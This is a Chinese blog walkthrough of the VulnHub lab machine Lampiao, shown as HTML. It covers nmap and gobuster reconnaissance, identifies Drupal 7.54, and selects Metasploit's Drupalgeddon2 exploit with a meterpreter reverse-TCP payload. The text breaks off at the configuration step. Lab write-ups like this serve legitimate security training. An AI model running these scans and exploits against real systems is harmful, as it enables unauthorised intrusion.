@@ -1,0 +1,764 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明 靶机说明：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;lampiao-1,249&#x2F; 下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;lampiao&#x2F;Lampiao.zip 难度：easy  主机发现123456789101112131415┌──(kali㉿kali)-[~]└─$ sudo nmap -sn 192.168.2.0&#x2F;24Startin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lampiao">
+<meta property="og:url" content="http://miao-sec.github.io/vulnhub/Lampiao/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明 靶机说明：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;lampiao-1,249&#x2F; 下载地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;lampiao&#x2F;Lampiao.zip 难度：easy  主机发现123456789101112131415┌──(kali㉿kali)-[~]└─$ sudo nmap -sn 192.168.2.0&#x2F;24Startin">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081035901.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081051355.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102193.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102339.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081139012.png">
+<meta property="article:published_time" content="2025-06-20T02:54:27.000Z">
+<meta property="article:modified_time" content="2025-06-20T03:02:32.587Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="drupal">
+<meta property="article:tag" content="提权-dirtycow">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081035901.png">
+  
+  
+  
+  <title>Lampiao - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Miaosec</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lampiao"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-20 10:54" pubdate>
+          2025年6月20日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lampiao</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul>
+<li>靶机说明：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></li>
+<li>下载地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/lampiao/Lampiao.zip">https://download.vulnhub.com/lampiao/Lampiao.zip</a></li>
+<li>难度：easy</li>
+</ul>
+<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00068s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00043s latency).<br>MAC Address: 08:00:27:07:6D:A0 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00067s latency).<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.07 seconds<br></code></pre></td></tr></table></figure>
+<h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.10 -oA nmapscan/ports            <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0021s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1898/tcp open  cymtec-port<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 22.19 seconds<br></code></pre></td></tr></table></figure>
+<ul>
+<li>发现开放端口22,80,1898<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80,1898 192.168.2.10 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:25 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>80/tcp   open  http?<br>1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port80-TCP:V=7.94SVN%I=7%D=2/8%Time=67A6C09D%P=x86_64-pc-linux-gnu%r(NU<br>SF:LL,1179,<span class="hljs-string">&quot;\x20_____\x20_\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="hljs-string">SF:\|_\|\x20\|\x20\(_\|\x20\|_\|\n\\_\|\x20\x20\x20\|_\|\x20\x20\\__,_\|\\</span><br><span class="hljs-string">SF:__,_\|_\|\x20\|_\|&quot;</span>);<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 52.18 seconds<br></code></pre></td></tr></table></figure>
+（3）进行UDP扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80,1898 192.168.2.10 -oA nmapscan/udp                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00095s latency).<br><br>PORT     STATE  SERVICE<br>22/udp   closed ssh<br>80/udp   closed http<br>1898/udp closed cymtec-port<br>MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.49 seconds<br></code></pre></td></tr></table></figure></li>
+<li>没有开放的udp端口<br>（4）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,1898 192.168.2.10 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 10:29 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.0012s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)<br>|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">1898/tcp open  cymtec-port</span><br><span class="hljs-string">MAC Address: 08:00:27:62:07:F9 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 49.75 seconds</span><br></code></pre></td></tr></table></figure></li>
+<li>没有扫描出漏洞</li>
+</ul>
+<h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，是一个静态页面，查看页面源码，没有发现有用的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081035901.png" srcset="/img/loading.gif" lazyload><br>（2）进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.10<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br><br>Error: error on running gobuster: unable to connect to http://192.168.2.10/: Get <span class="hljs-string">&quot;http://192.168.2.10/&quot;</span>: <span class="hljs-built_in">read</span> tcp 192.168.2.4:38794-&gt;192.168.2.10:80: <span class="hljs-built_in">read</span>: connection reset by peer<br></code></pre></td></tr></table></figure>
+<ul>
+<li>发现无法连接到80端口</li>
+</ul>
+<h2 id="1898端口渗透"><a href="#1898端口渗透" class="headerlink" title="1898端口渗透"></a>1898端口渗透</h2><p>（1）访问1898端口，发现使用的cms是<code>drupal</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081051355.png" srcset="/img/loading.gif" lazyload><br>（2）对1898端口进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.10:1898 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.10:1898<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 286]<br>/.php                 (Status: 403) [Size: 285]<br>/misc                 (Status: 301) [Size: 317] [--&gt; http://192.168.2.10:1898/misc/]<br>/themes               (Status: 301) [Size: 319] [--&gt; http://192.168.2.10:1898/themes/]<br>/modules              (Status: 301) [Size: 320] [--&gt; http://192.168.2.10:1898/modules/]<br>/scripts              (Status: 301) [Size: 320] [--&gt; http://192.168.2.10:1898/scripts/]<br>/index.php            (Status: 200) [Size: 11400]<br>/sites                (Status: 301) [Size: 318] [--&gt; http://192.168.2.10:1898/sites/]<br>/includes             (Status: 301) [Size: 321] [--&gt; http://192.168.2.10:1898/includes/]<br>/profiles             (Status: 301) [Size: 321] [--&gt; http://192.168.2.10:1898/profiles/]<br>/update.php           (Status: 403) [Size: 4129]<br>/install.php          (Status: 200) [Size: 3257]<br>/robots.txt           (Status: 200) [Size: 2189]<br>/cron.php             (Status: 403) [Size: 7390]<br>/xmlrpc.php           (Status: 200) [Size: 42]<br>/.php                 (Status: 403) [Size: 285]<br>/.html                (Status: 403) [Size: 286]<br>/server-status        (Status: 403) [Size: 294]<br>/authorize.php        (Status: 403) [Size: 2896]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<ul>
+<li><p>发现挺多的敏感文件，访问<code>robots.txt</code>，找到<code>CHANGELOG.txt</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102193.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>发现该框架<code>drupal</code>的版本信息为<code>7.54</code>，时间为2017年2月1日<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081102339.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<h2 id="cms-drupal渗透"><a href="#cms-drupal渗透" class="headerlink" title="cms-drupal渗透"></a>cms-drupal渗透</h2><p>（1）通过上述的渗透，最终确认该系统使用的CMS是<code>drupal</code>，版本为<code>7.54</code>，时间为<code>2017-02-01</code>，通过Google搜索17年以后的漏洞或者使用msf进行搜索</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/lampiao]<br>└─$ msfconsole    <br>Metasploit tip: Use the edit <span class="hljs-built_in">command</span> to open the currently active module <br><span class="hljs-keyword">in</span> your editor<br>                                                  <br><span class="hljs-comment"># cowsay++</span><br> ____________<br>&lt; metasploit &gt;<br> ------------<br>       \   ,__,<br>        \  (oo)____<br>           (__)    )\<br>              ||--|| *<br><br><br>       =[ metasploit v6.4.20-dev                          ]<br>+ -- --=[ 2440 exploits - 1256 auxiliary - 429 post       ]<br>+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]<br>+ -- --=[ 9 evasion                                       ]<br><br>Metasploit Documentation: https://docs.metasploit.com/<br><br>msf6 &gt; search drupal<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span><br>   -   ----                                                              ---------------  ----       -----  -----------<br>   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution<br>   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection<br>   2     \_ target: Automatic (PHP In-Memory)                            <br>   3     \_ target: Automatic (PHP Dropper)                              <br>   4     \_ target: Automatic (Unix In-Memory)                           <br>   5     \_ target: Automatic (Linux Dropper)                            <br>   6     \_ target: Drupal 7.x (PHP In-Memory)                           <br>   7     \_ target: Drupal 7.x (PHP Dropper)                             <br>   8     \_ target: Drupal 7.x (Unix In-Memory)                          <br>   9     \_ target: Drupal 7.x (Linux Dropper)                           <br>   10    \_ target: Drupal 8.x (PHP In-Memory)                           <br>   11    \_ target: Drupal 8.x (PHP Dropper)                             <br>   12    \_ target: Drupal 8.x (Unix In-Memory)                          <br>   13    \_ target: Drupal 8.x (Linux Dropper)                           <br>   14    \_ AKA: SA-CORE-2018-002                                        <br>   15    \_ AKA: Drupalgeddon 2                                          <br>   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection<br>   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  <br>   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   <br>   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection<br>   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution<br>   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE<br>   22    \_ target: PHP In-Memory                                        <br>   23    \_ target: Unix In-Memory                                       <br>   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration<br>   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution<br><br>Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval<br><br></code></pre></td></tr></table></figure>
+
+<p>（2）结合搜集到信息，选择<code>drupal_drupalgeddon2 2018-03-28</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure>
+<p>（3）进行相关的设置</p>
